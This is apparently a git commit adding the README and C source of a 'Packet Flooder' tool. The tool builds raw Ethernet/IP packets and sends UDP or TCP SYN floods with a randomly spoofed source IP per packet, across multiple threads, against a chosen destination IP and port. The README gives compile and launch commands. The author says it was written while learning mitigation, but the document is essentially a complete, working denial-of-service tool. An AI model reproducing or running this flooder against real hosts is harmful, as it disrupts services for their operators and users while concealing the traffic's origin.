f71bffc133f244e5fc90cf98f04bc83773783cb4
Christian Deacon <gamemann@gflclan.com>
2020-04-30 03:38:40 +0000

    Initial Commit

---
+++ README.md
@@ -0,0 +1,42 @@
+# Packet Flooder
+## Description
+This is an improved version of my UDP Sender [program](https://github.com/gamemann/UDP-Sender). However, this program also supports TCP SYN floods. The source IP is completely randomized/spoofed each time a packet is sent. 
+
+## What Did I make This?
+I've been learning how to mitigate TCP-related attacks recently and decided to make a TCP SYN flood tool. Since I was planning to rewrite my UDP Sender program anyways, I decided to create a program that does both UDP and TCP (SYN) floods.
+
+## Compiling
+I used GCC to compile this program. You must add `-lpthread` at the end of the command when compiling via GCC.
+
+Here's an example:
+
+```
+gcc -g src/flood.c -o src/flood -lpthread
+```
+
+## Usage
+Here's output from the `--help` flag that goes over the program's command line usage:
+
+```
+./flood --help
+Usage for: ./flood:
+--dev -i => Interface name to bind to
+--dst -d => Destination IP to send TCP packets to
+--port -p => Destination port (0 = random port)
+--interval => Interval between sending packets in micro seconds.
+--threads -t => Amount of threads to spawn (default is host's CPU count)
+--verbose -v => Print how much data we sent each time.
+--min => Minimum payload length.
+--max => Maximum payload length.
+--tcp => Send TCP packet with SYN flag set instead of UDP packet.
+--help -h => Show help menu information.
+```
+
+Example:
+
+```
+./flood --dev ens18 --dst 10.50.0.4 --port 80 -t 1 --interval 100000 --tcp --min 1200 --max 1200 -v
+```
+
+## Credits
+* [Christian Deacon](https://www.linkedin.com/in/christian-deacon-902042186/) - Created program.
---
+++ src/flood.c
@@ -0,0 +1,435 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <linux/if.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <linux/if_packet.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <sys/ioctl.h>
+#include <inttypes.h>
+#include <getopt.h>
+#include <pthread.h>
+#include <string.h>
+
+#include "include/csum.h"
+
+#define MAX_PCKT_LENGTH 0xFFFF
+
+// Command line structure.
+struct pcktinfo
+{
+    char *dIP;
+    char *interface;
+    uint16_t port;
+    uint64_t time;
+    uint16_t threads;
+    uint16_t min;
+    uint16_t max;
+} pckt;
+
+// Global variables.
+uint8_t cont = 1;
+int help = 0;
+int tcp = 0;
+int verbose = 0;
+uint8_t dMAC[ETH_ALEN];
+uint8_t sMAC[ETH_ALEN];
+
+void signalHndl(int tmp)
+{
+    cont = 0;
+}
+
+void GetGatewayMAC()
+{
+    char cmd[] = "ip neigh | grep \"$(ip -4 route list 0/0|cut -d' ' -f3) \"|cut -d' ' -f5|tr '[a-f]' '[A-F]'";
+
+    FILE *fp =  popen(cmd, "r");
+
+    if (fp != NULL)
+    {
+        char line[18];
+
+        if (fgets(line, sizeof(line), fp) != NULL)
+        {
+            sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dMAC[0], &dMAC[1], &dMAC[2], &dMAC[3], &dMAC[4], &dMAC[5]);
+        }
+
+        pclose(fp);
+    }
+}
+
+uint16_t randNum(uint16_t min, uint16_t max)
+{
+    return (rand() % (max - min + 1)) + min;
+}
+
+void *threadHndl(void *data)
+{
+    // Create sockaddr_ll struct.
+    struct sockaddr_ll sin;
+
+    // Fill out sockaddr_ll struct.
+    sin.sll_family = PF_PACKET;
+    sin.sll_ifindex = if_nametoindex(pckt.interface);
+    sin.sll_protocol = htons(ETH_P_IP);
+    sin.sll_halen = ETH_ALEN;
+
+    // Initialize socket FD.
+    int sockfd;
+
+    // Attempt to create socket.
+    if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+        perror("socket");
+
+        pthread_exit(NULL);
+    }
+
+    // Receive the interface's MAC address (the source MAC).
+    struct ifreq ifr;
+    strcpy(ifr.ifr_name, pckt.interface);
+
+    // Attempt to get MAC address.
+    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) != 0)
+    {
+        perror("ioctl");
+
+        pthread_exit(NULL);
+    }
+
+    // Copy source MAC to necessary variables.
+    memcpy(sMAC, ifr.ifr_addr.sa_data, ETH_ALEN);
+    memcpy(sin.sll_addr, sMAC, ETH_ALEN);
+
+    // Attempt to bind socket.
+    if (bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) != 0)
+    {
+        perror("bind");
+
+        pthread_exit(NULL);
+    }
+
+    // Loop.
+    while (cont)
+    {
+        // Get source port (random).
+        uint16_t srcPort;
+
+        srcPort = randNum(1024, 65535);
+
+        // Get destination port.
+        uint16_t dstPort;
+
+        // Check if port is 0 (random).
+        if (pckt.port == 0)
+        {
+            dstPort = randNum(10, 65535);
+        }
+        else
+        {
+            dstPort = pckt.port;
+        }
+
+        // Spoof source IP as any IP address.
+        uint16_t tmp[4];
+        char IP[32];
+
+        tmp[0] = randNum(1, 254);
+        tmp[1] = randNum(1, 254);
+        tmp[2] = randNum(1, 254);
+        tmp[3] = randNum(1, 254);
+
+        sprintf(IP, "%d.%d.%d.%d", tmp[0], tmp[1], tmp[2], tmp[3]);
+
+        // Initialize packet buffer.
+        char buffer[MAX_PCKT_LENGTH];
+
+        // Create ethernet header.
+        struct ethhdr *eth = (struct ethhdr *)(buffer);
+
+        // Fill out ethernet header.
+        eth->h_proto = htons(ETH_P_IP);
+        memcpy(eth->h_source, sMAC, ETH_ALEN);
+        memcpy(eth->h_dest, dMAC, ETH_ALEN);
+
+        // Create IP header.
+        struct iphdr *iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
+
+        // Fill out IP header.
+        iph->ihl = 5;
+        iph->version = 4;
+
+        // Check for TCP.
+        if (tcp)
+        {
+            iph->protocol = IPPROTO_TCP;
+        }
+        else
+        {
+            iph->protocol = IPPROTO_UDP;
+        }
+        
+        iph->id = 0;
+        iph->frag_off = 0;
+        iph->saddr = inet_addr(IP);
+        iph->daddr = inet_addr(pckt.dIP);
+        iph->tos = 0x00;
+        iph->ttl = 64;
+
+        // Calculate payload length and payload.
+        uint16_t dataLen = randNum(pckt.min, pckt.max);
+
+        // Initialize payload.
+        uint16_t l4header = (iph->protocol == IPPROTO_TCP) ? sizeof(struct tcphdr) : sizeof(struct udphdr);
+        unsigned char *data = (unsigned char *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + l4header);
+
+        // Fill out payload with random characters.
+        for (uint16_t i = 0; i < dataLen; i++)
+        {
+            *data = rand() % 255;
+            *data++;
+        }
+
+        // Check protocol.
+        if (iph->protocol == IPPROTO_TCP)
+        {
+            // Create TCP header.
+            struct tcphdr *tcph = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
+
+            // Fill out TCP header.
+            tcph->doff = 5;
+            tcph->source = htons(srcPort);
+            tcph->dest = htons(dstPort);
+            tcph->ack_seq = 0;
+            tcph->seq = 0;
+
+            // Set SYN flag to 1.
+            tcph->syn = 1;
+
+            // Calculate length and checksum of IP header.
+            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + dataLen);
+            iph->check = 0;
+            iph->check = ip_fast_csum(iph, iph->ihl);
+
+            // Calculate TCP header checksum.
+            tcph->check = 0;
+            tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, sizeof(struct tcphdr) + dataLen, IPPROTO_TCP, csum_partial(tcph, sizeof(struct tcphdr) + dataLen, 0));
+        }
+        else
+        {
+            // Create UDP header.
+            struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
+
+            // Fill out UDP header.
+            udph->source = htons(srcPort);
+            udph->dest = htons(dstPort);
+            udph->len = htons(sizeof(struct udphdr) + dataLen);
+
+            // Calculate length and checksum of IP header.
+            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dataLen);
+            iph->check = 0;
+            iph->check = ip_fast_csum(iph, iph->ihl);
+
+            // Calculate UDP header checksum.
+            udph->check = 0;
+            udph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, sizeof(struct udphdr) + dataLen, IPPROTO_UDP, csum_partial(udph, sizeof(struct udphdr) + dataLen, 0));
+        }
+        
+        // Initialize variable that represents how much data we've sent.
+        uint16_t sent;
+
+        // Attempt to send data.
+        if ((sent = sendto(sockfd, buffer, ntohs(iph->tot_len) + sizeof(struct ethhdr), 0, (struct sockaddr *)&sin, sizeof(sin))) < 0)
+        {
+            perror("send");
+
+            continue;
+        }
+
+        // Verbose mode.
+        if (verbose)
+        {
+            fprintf(stdout, "Sent %d bytes to destination.\n", sent);
+        }
+
+        // Check if we should wait between packets.
+        if (pckt.time > 0)
+        {
+            usleep(pckt.time);
+        }
+    }
+
+    // Close socket.
+    close(sockfd);
+}
+
+// Command line options.
+static struct option longoptions[] =
+{
+    {"dev", required_argument, NULL, 'i'},
+    {"dst", required_argument, NULL, 'd'},
+    {"port", required_argument, NULL, 'p'},
+    {"interval", required_argument, NULL, 1},
+    {"threads", required_argument, NULL, 't'},
+    {"min", required_argument, NULL, 2},
+    {"max", required_argument, NULL, 3},
+    {"verbose", no_argument, &verbose, 'v'},
+    {"tcp", no_argument, &tcp, 4},
+    {"help", no_argument, &help, 'h'},
+    {NULL, 0, NULL, 0}
+};
+
+void parse_command_line(int argc, char *argv[])
+{
+    int c;
+
+    // Parse command line.
+    while ((c = getopt_long(argc, argv, "i:d:t:vh", longoptions, NULL)) != -1)
+    {
+        switch(c)
+        {
+            case 'i':
+                pckt.interface = optarg;
+
+                break;
+
+            case 'd':
+                pckt.dIP = optarg;
+
+                break;
+
+            case 'p':
+                pckt.port = atoi(optarg);
+
+                break;
+
+            case 1:
+                pckt.time = strtoll(optarg, NULL, 10);
+
+                break;
+
+            case 't':
+                pckt.threads = atoi(optarg);
+
+                break;
+
+            case 2:
+                pckt.min = atoi(optarg);
+
+                break;
+
+            case 3:
+                pckt.max = atoi(optarg);
+
+                break;
+
+            case 'v':
+                verbose = 1;
+
+                break;
+
+            case 'h':
+                help = 1;
+
+                break;
+
+            case '?':
+                fprintf(stderr, "Missing argument.\n");
+
+                break;
+        }
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    // Set optional defaults.
+    pckt.threads = get_nprocs();
+    pckt.time = 1000000;
+    pckt.port = 0;
+    pckt.min = 0;
+    pckt.max = 1200;
+
+    // Parse the command line.
+    parse_command_line(argc, argv);
+
+    // Check if help flag is set. If so, print help information.
+    if (help)
+    {
+        fprintf(stdout, "Usage for: %s:\n" \
+            "--dev -i => Interface name to bind to\n" \
+            "--dst -d => Destination IP to send TCP packets to\n" \
+            "--port -p => Destination port (0 = random port)\n" \
+            "--interval => Interval between sending packets in micro seconds.\n" \
+            "--threads -t => Amount of threads to spawn (default is host's CPU count)\n" \
+            "--verbose -v => Print how much data we sent each time.\n" \
+            "--min => Minimum payload length.\n" \
+            "--max => Maximum payload length.\n" \
+            "--tcp => Send TCP packet with SYN flag set instead of UDP packet.\n" \
+            "--help -h => Show help menu information.\n", argv[0]);
+
+        exit(0);
+    }
+
+    // Check if interface argument was set.
+    if (pckt.interface == NULL)
+    {
+        fprintf(stderr, "Missing --dev option.\n");
+
+        exit(1);
+    }
+
+    // Check if destination IP argument was set.
+    if (pckt.dIP == NULL)
+    {
+        fprintf(stderr, "Missing --dst option\n");
+
+        exit(1);
+    }
+
+    // Get destination MAC address (gateway MAC).
+    GetGatewayMAC();
+
+    // Print information.
+    fprintf(stdout, "Launching against %s:%d (0 = random) from interface %s. Thread count => %d and Time => %" PRIu64 " micro seconds.\n", pckt.dIP, pckt.port, pckt.interface, pckt.threads, pckt.time);
+
+    // Loop thread each thread.
+    for (uint16_t i = 0; i < pckt.threads; i++)
+    {
+        // Create pthread.
+        pthread_t pid;
+
+        if ((pid = pthread_create(&pid, NULL, threadHndl, NULL) != 0))
+        {
+            fprintf(stderr, "Error spawning thread %" PRIu16 "...\n", i);
+        }
+    }
+
+    // Signal.
+    signal(SIGINT, signalHndl);
+    
+    // Loop!
+    while (cont)
+    {
+        sleep(1);
+    }
+
+    // Debug.
+    fprintf(stdout, "Cleaning up...\n");
+
+    // Wait a second for cleanup.
+    sleep(1);
+
+    // Exit program successfully.
+    exit(0);
+}
